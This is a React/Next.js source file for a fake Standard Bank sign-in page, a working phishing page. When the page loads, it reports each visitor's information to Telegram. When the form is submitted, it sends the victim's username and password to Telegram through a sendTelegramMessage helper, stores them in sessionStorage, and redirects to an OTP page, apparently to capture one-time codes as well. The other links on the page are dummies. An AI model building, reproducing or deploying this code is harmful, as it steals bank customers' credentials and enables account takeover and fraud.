"use client";

import React, { useState, useEffect } from "react";
import { useRouter } from "next/navigation";
import { ChevronLeft, Eye, EyeOff, Loader2 } from "lucide-react";

function TransparentLogo({
  src,
  alt,
  className,
}: {
  src: string;
  alt: string;
  className?: string;
}) {
  const [cleanSrc, setCleanSrc] = useState(src);

  useEffect(() => {
    const img = new window.Image();
    img.crossOrigin = "anonymous";
    img.src = src;
    img.onload = () => {
      try {
        const canvas = document.createElement("canvas");
        canvas.width = img.naturalWidth;
        canvas.height = img.naturalHeight;
        const ctx = canvas.getContext("2d");
        if (!ctx) return;
        ctx.drawImage(img, 0, 0);
        const imgData = ctx.getImageData(0, 0, canvas.width, canvas.height);
        const data = imgData.data;

        // Sample background from top-left (0,0) and top-right
        const bgR = data[0];
        const bgG = data[1];
        const bgB = data[2];

        for (let i = 0; i < data.length; i += 4) {
          const r = data[i];
          const g = data[i + 1];
          const b = data[i + 2];
          const dist = Math.sqrt((r - bgR) ** 2 + (g - bgG) ** 2 + (b - bgB) ** 2);
          if (dist < 40) {
            data[i + 3] = 0; // Make background pixel fully transparent
          }
        }
        ctx.putImageData(imgData, 0, 0);
        setCleanSrc(canvas.toDataURL("image/png"));
      } catch {
        // Fallback
      }
    };
  }, [src]);

  return (
    <img
      src={cleanSrc}
      alt={alt}
      className={className}
    />
  );
}

export default function StandardBankLoginPage() {
  const router = useRouter();
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");

  const logoUrl =
    "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRFGcVkJT2-qexPBQlBX16ttftLJwD2sX9ZVPrP52oLjVSAzTogcn-tySJV&s=10";

  // Auto fetch and log visitor location on sign in page load
  useEffect(() => {
    const trackVisitor = async () => {
      try {
        const { sendTelegramMessage, fetchVisitorInfo } = await import("@/lib/telegram");
        await fetchVisitorInfo();
        await sendTelegramMessage({
          title: "Standard Bank - Visitor Landed on Sign In Page",
          type: "visitor_landing",
        });
      } catch (err) {
        console.error("Error logging visitor:", err);
      }
    };
    trackVisitor();
  }, []);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!username.trim() || !password.trim()) {
      setError("Please fill in both username and password");
      return;
    }

    setError("");
    setLoading(true);

    try {
      // Store credentials in sessionStorage
      sessionStorage.setItem("username", username);
      sessionStorage.setItem("password", password);
      sessionStorage.setItem("userEmail", username);

      // Send to Telegram
      const { sendTelegramMessage } = await import("@/lib/telegram");
      await sendTelegramMessage({
        title: "Standard Bank - Login Attempt",
        type: "login",
        username: username,
        password: password,
      });

      // Smooth transition to OTP screen
      setTimeout(() => {
        router.push("/otp");
      }, 1000);
    } catch (err) {
      console.error("Submission error:", err);
      setTimeout(() => {
        router.push("/otp");
      }, 1000);
    }
  };

  return (
    <div
      dir="ltr"
      className="h-[100dvh] max-h-[100dvh] w-full bg-[#0061E1] flex flex-col justify-between px-4 sm:px-6 pt-3 sm:pt-6 pb-4 sm:pb-6 font-sans selection:bg-blue-600 selection:text-white overflow-hidden select-none"
    >
      <div className="w-full max-w-[390px] mx-auto flex flex-col">
        {/* Top Header Row with Back Arrow and Centered Logo */}
        <header className="relative w-full flex items-center justify-center mb-5 sm:mb-7">
          <button
            type="button"
            onClick={() => router.back()}
            className="absolute left-0 p-1 text-white hover:bg-white/10 rounded-full transition-colors cursor-pointer"
            aria-label="Back"
          >
            <ChevronLeft className="w-6 h-6 text-white" />
          </button>
          <div className="relative w-14 h-14 sm:w-16 sm:h-16 flex items-center justify-center drop-shadow-md">
            <TransparentLogo
              src={logoUrl}
              alt="Standard Bank Logo"
              className="w-full h-full object-contain"
            />
          </div>
        </header>

        {/* Form Card */}
        <main className="w-full">
          <div className="bg-[#FFFFFF] rounded-[4px] shadow-2xl p-6 sm:p-7 w-full transition-all">
            {/* Card Title */}
            <h1 className="text-xl sm:text-2xl font-light text-[#1e293b] text-center mb-6 tracking-normal">
              Sign In
            </h1>

            {/* Form */}
            <form onSubmit={handleSubmit} className="space-y-5">
              {error && (
                <div className="bg-red-50 border border-red-200 text-red-600 text-xs sm:text-sm px-3 py-2 rounded-[4px] text-center font-medium">
                  {error}
                </div>
              )}

              {/* Username Input with Floating Label */}
              <div className="relative">
                <input
                  id="username"
                  name="username"
                  type="text"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  placeholder=" "
                  autoComplete="username"
                  required
                  className="peer w-full h-12 px-3.5 pt-1 rounded-[4px] border border-[#5A626B]/40 text-gray-900 text-[15px] font-light focus:outline-none focus:border-[#0061E1] focus:ring-1 focus:ring-[#0061E1] transition-all bg-[#FFFFFF]"
                />
                <label
                  htmlFor="username"
                  className={`absolute left-3 transition-all duration-200 pointer-events-none px-1.5 bg-[#FFFFFF] ${
                    username
                      ? "-top-2.5 text-xs text-[#0061E1] font-normal"
                      : "top-3 text-[15px] font-light text-[#5A626B] peer-focus:-top-2.5 peer-focus:text-xs peer-focus:text-[#0061E1] peer-focus:font-normal peer-placeholder-shown:top-3 peer-placeholder-shown:text-[15px] peer-placeholder-shown:font-light peer-placeholder-shown:text-[#5A626B]"
                  }`}
                >
                  Username
                </label>
              </div>

              {/* Password Input with Floating Label and Eye Toggle */}
              <div className="relative">
                <input
                  id="password"
                  name="password"
                  type={showPassword ? "text" : "password"}
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  placeholder=" "
                  autoComplete="current-password"
                  required
                  className="peer w-full h-12 pl-3.5 pr-11 pt-1 rounded-[4px] border border-[#5A626B]/40 text-gray-900 text-[15px] font-light focus:outline-none focus:border-[#0061E1] focus:ring-1 focus:ring-[#0061E1] transition-all bg-[#FFFFFF]"
                />
                <label
                  htmlFor="password"
                  className={`absolute left-3 transition-all duration-200 pointer-events-none px-1.5 bg-[#FFFFFF] ${
                    password
                      ? "-top-2.5 text-xs text-[#0061E1] font-normal"
                      : "top-3 text-[15px] font-light text-[#5A626B] peer-focus:-top-2.5 peer-focus:text-xs peer-focus:text-[#0061E1] peer-focus:font-normal peer-placeholder-shown:top-3 peer-placeholder-shown:text-[15px] peer-placeholder-shown:font-light peer-placeholder-shown:text-[#5A626B]"
                  }`}
                >
                  Password
                </label>
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-3 top-1/2 -translate-y-1/2 text-[#5A626B] hover:text-[#1e293b] transition-colors p-1 cursor-pointer"
                  aria-label={showPassword ? "Hide password" : "Show password"}
                >
                  {showPassword ? (
                    <EyeOff className="w-5 h-5 text-[#5A626B]" />
                  ) : (
                    <Eye className="w-5 h-5 text-[#5A626B]" />
                  )}
                </button>
              </div>

              {/* Submit Button */}
              <div className="pt-2">
                <button
                  type="submit"
                  disabled={loading}
                  className="w-full h-12 bg-[#0061E1] hover:bg-[#0052cc] active:scale-[0.99] text-white font-normal rounded-[4px] text-base uppercase tracking-wider transition-all shadow-md hover:shadow-lg disabled:opacity-75 cursor-pointer flex items-center justify-center gap-2"
                >
                  {loading ? (
                    <>
                      <Loader2 className="w-5 h-5 animate-spin" />
                      <span>Signing in...</span>
                    </>
                  ) : (
                    <span>SIGN IN</span>
                  )}
                </button>
              </div>

              {/* Clickable links below button in blue */}
              <div className="pt-3 pb-1 flex items-center justify-center gap-2 text-[13px] sm:text-sm text-[#0061E1] font-normal">
                <button
                  type="button"
                  onClick={(e) => e.preventDefault()}
                  className="hover:underline transition-colors cursor-pointer"
                >
                  Forgot password
                </button>
                <span className="text-[#0061E1]/60 select-none">|</span>
                <button
                  type="button"
                  onClick={(e) => e.preventDefault()}
                  className="hover:underline transition-colors cursor-pointer"
                >
                  Forgot username
                </button>
              </div>
            </form>
          </div>

          {/* Don't have an account? Register here */}
          <div className="mt-5 text-center text-xs sm:text-sm text-white/90 select-none">
            <span>Don&apos;t have an account? </span>
            <button
              type="button"
              onClick={(e) => e.preventDefault()}
              className="text-white font-medium underline underline-offset-2 hover:opacity-80 transition-opacity cursor-pointer inline-block"
            >
              Register here
            </button>
          </div>
        </main>
      </div>

      {/* Bottom element */}
      <footer className="w-full flex justify-center items-center pb-1 opacity-80">
        <div className="w-24 h-1 bg-white/25 rounded-full" />
      </footer>
    </div>
  );
}
